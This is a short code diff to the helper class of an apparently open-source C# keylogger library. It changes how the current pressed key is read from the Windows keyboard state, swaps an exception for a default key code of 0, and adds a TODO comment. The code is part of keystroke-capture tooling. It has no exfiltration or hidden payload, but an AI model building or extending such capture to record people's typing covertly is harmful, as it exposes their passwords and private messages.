@@ -31,7 +31,7 @@ namespace KeyLogger.Library.Helpers
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool GetKeyboardState(byte[] lpKeyState);
 
-        private static byte[] keys;
+        private static byte[] keys = new byte[KEYS_LENGTH];
 
         public static char GetKeyPressed()
         {
@@ -46,14 +46,15 @@ namespace KeyLogger.Library.Helpers
 
             GetKeyState(10);
 
-            if (!GetKeyboardState(keys))
-                throw new Win32Exception();
+            int keyCode = 0;
 
-            var key = getKeyCodePressed(keys);
+            if (GetKeyboardState(keys))
+                keyCode = getKeyCodePressed(keys);
 
-            return KeyConverter.KeyCodeToChar2(key);
+            return KeyConverter.KeyCodeToChar2(keyCode);
         }
 
+        //TODO: Change algorithm
         private static int getKeyCodePressed(byte[] keys)
         {
             int i = 0;
